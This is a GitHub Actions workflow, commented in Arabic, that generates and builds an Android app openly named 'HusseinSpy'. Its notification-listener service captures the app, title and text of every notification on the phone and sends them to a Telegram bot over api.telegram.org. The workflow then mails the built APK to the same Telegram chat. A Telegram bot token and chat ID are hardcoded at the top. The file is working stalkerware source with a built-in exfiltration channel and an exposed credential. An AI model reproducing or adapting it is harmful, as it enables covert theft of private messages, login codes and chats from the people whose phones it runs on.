name: Hussein Ultimate Notification To Telegram

on:
  workflow_dispatch:

env:
  # بياناتك الشخصية مدمجة برمجياً داخل التطبيق
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🛠️ Create Full Source Code
        run: |
          mkdir -p app/src/main/java/com/hussein/spy
          mkdir -p app/src/main/res/layout

          # 1. الإعدادات الأساسية
          echo "rootProject.name = 'HusseinSpy'" > settings.gradle
          echo "include ':app'" >> settings.gradle

          # 2. ملف بناء التطبيق مع تصاريح كاملة
          cat <<EOF > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.hussein.spy'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.spy"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
          }
          EOF

          # 3. Manifest (إضافة تصريح الإنترنت والخدمة)
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              
              <application android:label="Hussein Spy" android:theme="@android:style/Theme.Material.Light">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service android:name=".NotificationService"
                      android:label="Hussein Notification Service"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # 4. الواجهة الرئيسية (لتفعيل الإذن)
          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
          package com.hussein.spy;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.widget.Button;
          import android.view.Gravity;
          import android.widget.LinearLayout;
          import android.widget.TextView;

          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  LinearLayout layout = new LinearLayout(this);
                  layout.setOrientation(LinearLayout.VERTICAL);
                  layout.setGravity(Gravity.CENTER);
                  
                  TextView tv = new TextView(this);
                  tv.setText("Hussein Notification Linker\nيجب تفعيل الوصول للإشعارات لكي يعمل الإرسال");
                  tv.setPadding(20, 20, 20, 20);
                  
                  Button btn = new Button(this);
                  btn.setText("تفعيل الإذن الآن");
                  btn.setOnClickListener(v -> {
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  });

                  layout.addView(tv);
                  layout.addView(btn);
                  setContentView(layout);
              }
          }
          EOF

          # 5. الكود الجوهري (سحب الإشعار وإرساله للتلغرام فوراً)
          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
          package com.hussein.spy;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.os.Bundle;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;

          public class NotificationService extends NotificationListenerService {
              
              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  Bundle extras = sbn.getNotification().extras;
                  String title = String.valueOf(extras.get("android.title"));
                  String text = String.valueOf(extras.get("android.text"));
                  String app = sbn.getPackageName();

                  String message = "📩 *إشعار جديد مسحوب* \n\n" +
                                   "📱 *التطبيق:* " + app + "\n" +
                                   "👤 *العنوان:* " + title + "\n" +
                                   "📝 *النص:* " + text;

                  sendToTelegram(message);
              }

              private void sendToTelegram(final String msg) {
                  new Thread(() -> {
                      try {
                          String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8") + "&parse_mode=Markdown";
                          URL url = new URL(urlString);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("GET");
                          conn.getResponseCode(); // تنفيذ الإرسال
                      } catch (Exception e) {
                          e.printStackTrace();
                      }
                  }).start();
              }
          }
          EOF

      - name: 🚀 Build APK
        run: |
          gradle wrapper
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: 📤 Send APK To You
        run: |
          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@$APK_FILE" \
            -F "caption=✅ تم بناء تطبيق سحب الإشعارات بنجاح يا حسين. قم بتثبيته وتفعيل الإذن لتبدأ باستلام الإشعارات هنا فوراً."
